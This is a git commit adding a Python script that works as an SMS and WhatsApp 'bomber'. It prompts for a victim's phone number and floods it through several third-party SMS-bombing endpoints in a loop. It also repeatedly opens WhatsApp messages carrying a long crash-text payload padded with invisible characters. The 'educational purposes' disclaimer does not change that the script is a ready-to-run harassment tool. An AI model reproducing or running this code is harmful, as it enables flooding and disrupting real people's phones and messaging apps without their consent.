b254057e577df309be1c90140b9a5f2bc9e68a55
Eliot <77872672+Elliot290@users.noreply.github.com>
2022-03-03 08:57:19 +0530

    Create BaapG.py

---
+++ BaapG.py
@@ -0,0 +1,172 @@
+import os
+import time
+import sys
+try:
+	import colorama
+except ModuleNotFoundError:
+	print("colorama is not Installed")
+	os.system("pip install colorama")
+try:
+	import requests
+except ModuleNotFoundError:
+	print("Requests is not Installed")
+	os.system("pip install requests")
+def check_intr():
+    try:
+        requests.get("https://motherfuckingwebsite.com")
+    except Exception:
+        print("Abe Chutiya Internet On Kar. Internet Error")
+        sys.exit(2)
+from colorama import  Fore,Style
+R = Fore.RED
+B = Fore.BLUE
+G = Fore.GREEN
+C = Fore.CYAN
+Y  = Fore.YELLOW
+M = Fore.MAGENTA
+W = Fore.WHITE
+RED="$(printf '\e[31m')"
+GREEN="$(printf '\e[32m')"
+ORANGE="$(printf '\e[33m')"
+BLUE="$(printf '\e[34m')"
+MAGENTA="$(printf '\e[35m')"
+CYAN="$(printf '\e[36m')"
+WHITE="$(printf '\e[37m')"
+BLACK="$(printf '\e[30m')"
+lic = """
+#  Copyright 2021 TDynamos <tdynamos@linux>
+#  
+#  This program is free software; you can redistribute it and/or modify
+#  it under the terms of the GNU General Public License as published by
+#  the Free Software Foundation; either version 2 of the License, or
+#  (at your option) any later version.
+#  
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU General Public License for more details.
+#  
+#  You should have received a copy of the GNU General Public License
+#  along with this program; if not, write to the Free Software
+#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,k
+#  MA 02110-1301, USA.
+# if You Have Any Problem Contact Me On Insta @krish_na_2568
+# Ghazipur Up India 
+# My Insta @Krish_na_2568
+"""
+
+logo = f"""
+{R}╭━━╮╱╱╱╱╱╱╱╱╱╭━━━╮ ╭━━━╮╭╮╱╭╮╱╱╱╱╱╱╭╮
+{R}┃╭╮┃╱╱╱╱╱╱╱╱╱┃╭━╮┃ ┃╭━╮┣╯╰┳╯╰╮╱╱╱╱╱┃┃
+{W}┃╰╯╰┳━━┳━━┳━━┫┃╱╰╯ ┃┃╱┃┣╮╭┻╮╭╋━━┳━━┫┃╭╮
+{W}┃╭━╮┃╭╮┃╭╮┃╭╮┃┃╭━╮ ┃╰━╯┃┃┃╱┃┃┃╭╮┃╭━┫╰╯╯
+{G}┃╰━╯┃╭╮┃╭╮┃╰╯┃╰┻━┃ ┃╭━╮┃┃╰╮┃╰┫╭╮┃╰━┫╭╮╮
+{G}╰━━━┻╯╰┻╯╰┫╭━┻━━━╯ ╰╯╱╰╯╰━╯╰━┻╯╰┻━━┻╯╰╯
+╱╱╱╱╱╱╱╱╱╱┃┃ {C}Author : {Y}BaapG Krishna {Y}Rajput
+╱╱╱╱╱╱╱╱╱╱╰╯ {C}Coder  : {Y}Ansh Dadwal
+ """
+os.system('clear')
+def sms():
+	check_intr()
+	os.system('clear')
+	print(Style.BRIGHT+logo)
+	print(G)
+	number=input(f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}")
+	print()
+	crash=int(input(f'{G}[{W}+{G}] How Many times do you want to Send [{W}1{G}] Better\n\n{R}>>>{G} '))
+	link = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link1 = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link2 = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link3 = f"https://newxxlr73.herokuapp.com/bomb/{number}"
+	link4 = f"https://newxxlr74.herokuapp.com/bomb/{number}"
+	link5 = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link1 = f"https://newxxlr76.herokuapp.com/bomb/{number}"
+	link6 = f"https://newxxlr81.herokuapp.com/bomb/{number}"
+	link7 = f"https://newxxlr81.herokuapp.com/bomb/{number}"
+	link8 = f"https://newxxlr82.herokuapp.com/bomb/{number}"
+	link9 = f"https://newxxlr83.herokuapp.com/bomb/{number}"
+	link10 = f"https://newxxlr84.herokuapp.com/bomb/{number}"
+	link11 = f"https://newxxlr85.herokuapp.com/bomb/{number}"
+	link12 = f"https://newxxlr86.herokuapp.com/bomb/{number}"
+	link = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link1 = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link2 = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link3 = f"https://newxxlr73.herokuapp.com/bomb/{number}"
+	link4 = f"https://newxxlr74.herokuapp.com/bomb/{number}"
+	link5 = f"https://online-pro.xyz/mix.php?mo={number}&access=MixBombz&submit=%F0%9F%92%A3+Bomb"
+	link1 = f"https://newxxlr76.herokuapp.com/bomb/{number}"
+	for i in range (crash):
+		print()
+		print(f"{Y}[✓] Sending Now")
+		requests.get(link)
+		requests.get(link1)
+		requests.get(link2)
+		requests.get(link3)
+		requests.get(link4)
+		requests.get(link5)
+		requests.get(link6)
+		requests.get(link7)
+		requests.get(link8)
+		requests.get(link9)
+		requests.get(link10)
+		requests.get(link11)
+		requests.get(link12)
+		print(f"{G} Successful Send 👍")
+				
+	res()
+def wpbomb():
+	check_intr()
+	os.system('clear')
+	print(logo)
+	print(G)
+	number=input(f"{G}[{W}+{G}] {G}Enter Victim's Phone number with country Code\n\n{R}>>>{G} ")
+	print()
+	crash=int(input(f'{G}[{W}+{G}] Enter the number of crashes {C}(Max 10000) \n\n{G}=> '))
+	link = (f"""xdg-open https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
+""")
+	for i in range (crash):
+		print()
+		print(f"{Y}[{W}✓{Y}] Sending Now")
+		link1 = os.system(link)
+		time.sleep(5)
+		if link1 == 0:
+			print(f"{G} Successful Send 👍 Insta @krish_na_2568")
+			pass
+		else:
+			print(f"{G}[×] Failed  ")
+		time.sleep(0.2)
+	res()
+def main():
+	check_intr()
+	os.system('clear')
+	print(logo)
+	print(Y)
+	os.system(f'dat=$(date) && echo {Y}  ✯ {W}STARTED ON : {C}$dat')
+	print(f"{W}\n-----------------------------------------------")
+	print(f"{Y}⚡ This tool is only for Educational Purposes !")
+	print(f"{W}-----------------------------------------------")
+	print(f"\n{G}Choose Any Option\n")
+	text = (f"""{G}[{W}1{G}]{R} BaapG-ATTACK {W}>>>\n{G}[{W}2{G}]{Y} WHATSAPP BOMBER{W} >>>\n{G}[{W}3{G}]{Y} About {W}>>>\n{G}[{W}4{G}]{Y} Exit {W}>>>\n""")
+	print(text)
+	a = input(f"{R} >>> {G}")
+	if a == '1':
+		sms()
+	elif a == '2':
+		wpbomb()
+	elif a == '3':
+		print(f"{C}\n All Credit : Krishna Singh Rajput \n {G}Coded by Ansh Dadwal\n\n{W}{lic}\n\n")
+		res()	
+	elif a == '4':
+		sys.exit(1)
+	else:
+		return main()	
+def res():
+	r=input(f"{Y}Do you want to restart [y/n] = ")
+	if r =='y':
+		main()
+	else:
+		print(h1)
+		print(f"Follow on Ig : {W}@krish_na_2568")
+		exit()
+print(Style.BRIGHT)		
+main()
